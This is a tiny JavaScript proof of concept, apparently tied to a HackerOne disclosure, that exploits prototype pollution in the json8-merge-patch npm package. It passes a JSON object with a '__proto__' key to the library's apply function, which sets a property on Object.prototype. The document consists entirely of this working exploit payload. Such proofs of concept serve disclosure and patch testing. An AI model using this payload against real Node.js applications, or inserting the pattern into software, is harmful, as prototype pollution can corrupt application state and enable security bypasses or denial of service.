//https://hackerone.com/reports/980649
  const json8mergepatch = require("json8-merge-patch");
  json8mergepatch.apply(
    {},
    JSON.parse('{ "__proto__": { "polluted": "yes" }}')
  );
